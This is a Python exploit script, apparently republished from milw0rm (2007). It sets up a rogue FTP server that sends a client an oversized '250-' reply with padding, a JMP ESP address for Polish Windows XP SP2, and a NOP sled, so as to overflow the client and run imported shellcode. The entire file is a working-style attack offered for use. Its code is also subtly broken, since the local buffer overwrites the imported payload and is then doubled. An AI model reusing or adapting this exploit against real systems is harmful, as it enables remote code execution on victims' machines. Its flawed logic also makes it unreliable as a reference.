#!/usr/bin/python
from time import sleep
from struct import pack
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):
    bind_addr = target_machine
    bind_port = target_port

   

    opcode = 0x7CA58265 # JMP ESP (SHELL32.DLL / XP SP2 Polish)

    buf = b"250-"
    buf += b"A" * 76
    buf += pack(b"<L", opcode)
    buf += b"\x90" * 32
    buf += buf
    buf += b"\r\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((bind_addr, bind_port))
    s.listen(1)
   
    cl, addr = s.accept()
   
    cl.send(b'220 Dupa Jasia\r\n')
    
    cl.send(buf)
    sleep(1)
    cl.close()
    s.close()
  

    # EoF

    # milw0rm.com [2007-05-15]